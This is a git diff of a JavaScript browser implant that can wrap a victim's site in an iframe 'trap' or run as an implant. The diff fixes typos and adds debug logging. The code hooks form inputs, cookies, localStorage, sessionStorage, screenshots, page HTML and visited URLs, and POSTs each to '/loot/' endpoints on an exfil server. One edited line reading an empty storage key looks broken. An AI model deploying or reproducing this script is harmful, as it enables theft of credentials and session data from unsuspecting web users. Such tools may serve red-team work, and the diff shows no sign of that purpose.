@@ -17,7 +17,7 @@ function initTaperVars()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "implant";
+	window.taperMode = "trap";
 
 
 	if (window.taperMode === "trap")
@@ -46,7 +46,7 @@ function initTaperVars()
 	}
 
 	// Exfil server
-	window.taperexfilServer = "https://192.168.2.61:8444";
+	window.taperexfilServer = "https://localhost:8444";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -199,6 +199,7 @@ function initSession()
 	
 	tapersessionName = adjective + "-" + color + "-" + murderer;
 	sessionStorage.setItem('taperSessionName', tapersessionName);
+	console.log("Session name picked: " + tapersessionName);
 }
 
 
@@ -223,7 +224,7 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + ssessionStorage.getItem('taperSessionName'));
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem('taperSessionName'));
 
 
 		// Helps hide flashing of the page when clicking around
@@ -253,7 +254,7 @@ function sendScreenshot()
 // events multiple times
 function hookInputs()
 {
-	if (window.taperMode === trap)
+	if (window.taperMode === "trap")
 	{
 		// User inputs are down in the iframe trap
 		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
@@ -283,7 +284,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/input/" + ssessionStorage.getItem('taperSessionName'));
+				request.open("POST", taperexfilServer + "/loot/input/" + sessionStorage.getItem('taperSessionName'));
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -318,37 +319,46 @@ function checkCookies()
 		cookieValue = cookieData[1];
 		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
 
-		cookieDict = JSON.parse(ssessionStorage.getItem('taperCookieStorage'));
-		if (cookieName in cookieDict)
+		var cookieDict = '';
+		if (sessionStorage.getItem('taperCookieStorage').length > 0)
 		{
-			// console.log("== Existing cookie: " + cookieName);
-			if (cookieDict[cookieName] != cookieValue)
+			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
+
+			if (cookieName in cookieDict)
 			{
-				// Existing cookie, but the value has changed
-				// console.log("     New cookie value: " + cookieValue);
-				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
-				cookieDict[cookieName] = cookieValue;
+				// console.log("== Existing cookie: " + cookieName);
+				if (cookieDict[cookieName] != cookieValue)
+				{
+					// Existing cookie, but the value has changed
+					// console.log("     New cookie value: " + cookieValue);
+					// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
+					cookieDict[cookieName] = cookieValue;
+				}
+				else
+				{
+					// Existing cookie, but no change in value to report
+					// console.log("     Cookie value unchanged");
+					continue;
+				}
 			}
-			else
-			{
-				// Existing cookie, but no change in value to report
-				// console.log("     Cookie value unchanged");
-				continue;
-			}
+
 		}
-		else 
-		{
-			// New cookie detected
-			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
-			cookieDict[cookieName] = cookieValue;
-		}
+
+		//cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
+		// else 
+		// {
+
+		// New cookie detected
+		// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
+		cookieDict[cookieName] = cookieValue;
+		// }
 
 		// Copy dictionary back to session storage
 		sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/dessert/" + ssessionStorage.getItem('taperSessionName'));
+		request.open("POST", taperexfilServer + "/loot/dessert/" + sessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -370,7 +380,7 @@ function checkLocalStorage()
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		localStorageDict = JSON.parse(ssessionStorage.getItem('taperLocalStorage'));
+		localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
 
 		if (key in localStorageDict)
 		{
@@ -404,7 +414,7 @@ function checkLocalStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + ssessionStorage.getItem('tapersessionName'));
+		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getItem('tapersessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -425,44 +435,61 @@ function checkSessionStorage()
 	{
 		key = sessionStorage.key(index)
 		value = sessionStorage.getItem(key)
-		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
+		console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
-
-		sessionStorageDict = JSON.parse(ssessionStorage.getItem('taperSessionStorage'));
-
-		if (key in sessionStorageDict)
+		if (key === "taperSessionStorage")
 		{
-			// Existing local storage key
-			//console.log("!!! Existing localstorage key...");
-			if (sessionStorageDict[key] != value)
+			// Should skip over our won session storage
+			continue;
+		}
+
+		var sessionStorageDict = '';
+
+		if (sessionStorage.getItem('taperSessionStorage').length > 0)
+		{
+			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
+
+			if (key in sessionStorageDict)
 			{
+				// Existing local storage key
+				//console.log("!!! Existing localstorage key...");
+				if (sessionStorageDict[key] != value)
+				{
 				// Existing localStorage, but the value has changed
 				 // console.log("     New sessionStorage value: " + value);
 				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
-				sessionStorageDict[key] = value;
-			}
-			else
-			{
+					sessionStorageDict[key] = value;
+				}
+				else
+				{
 				// Existing sessionStorage, but no change in value to report
 				// console.log("     sessionStorage value unchanged");
-				continue;
+					continue;
+				}
 			}
-
 		}
-		else
-		{
+		// else
+		// {
 			// New localStorage entry
 			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
+		if (value != null)
+		{
 			sessionStorageDict[key] = value;
 		}
+		// }
 
 		// Copy dictionary back to session storage
-		sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
+		console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
+		console.log("Length of dict is: " + sessionStorageDict.length);
+		if (sessionStorageDict.length > 0)
+		{
+			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
+		}
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + ssessionStorage.getItem('tapersessionName'));
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getItem('tapersessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -490,7 +517,7 @@ function sendHTML()
 	}
 
 	request = new XMLHttpRequest();
-	request.open("POST", taperexfilServer + "/loot/html/" + ssessionStorage.getItem('taperSessionName'));
+	request.open("POST", taperexfilServer + "/loot/html/" + sessionStorage.getItem('taperSessionName'));
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -553,7 +580,7 @@ function runUpdate()
 			// First click exits the iframe, reloads the normally. 
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
-			window.location = ssessionStorage.getItem('taperLastUrl');
+			window.location = sessionStorage.getItem('');
 		}
 
 		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
@@ -574,17 +601,17 @@ function runUpdate()
 	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
-	if (ssessionStorage.getItem('taperlastUrl') != currentUrl)
+	if (sessionStorage.getItem('taperlastUrl') != currentUrl)
 	{
 		// Handle URL recording
 		console.log("New trap URL, stealing the things: " + currentUrl);
-		sessionStorage.setItem('taperlastUrl') = currentUrl;
+		sessionStorage.setItem('taperlastUrl', currentUrl);
 
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/location/" + ssessionStorage.getItem('taperSessionName'));
+		request.open("POST", taperexfilServer + "/loot/location/" + sessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		
 		var jsonObj = new Object();
@@ -660,6 +687,7 @@ function takeOver()
 
 	if (window.taperMode === "trap")
 	{
+		console.log("Starting iFrame Trap!");
 	//document.body.style.backgroundColor = "pink";
 	//document.innerHTML = "";
 
@@ -704,6 +732,7 @@ function takeOver()
 	}
 	else
 	{
+		console.log("Starting implant!");
 		myReference = document.contentDocument;
 		for(var key in myReference){
 			if(key.search('on') === 0) {
@@ -723,11 +752,11 @@ function takeOver()
 
 
 
-//if (sessionStorage.getItem("taperClaimDebug")===null)
-if (sessionStorage.getItem('taperClaimDebug') != "true")
+//if (sessionStorage.getItem("taperSystemLoaded")===null)
+if (sessionStorage.getItem('taperSystemLoaded') != "true")
 {
-	sessionStorage.setItem("taperClaimDebug","true");
-	//window.taperClaimDebug = true;
+	sessionStorage.setItem("taperSystemLoaded","true");
+	//window.taperSystemLoaded = true;
 	//localStorage.setItem('trapLoaded', 'true');
 
 	// window.addEventListener("visibilitychange", function(e){
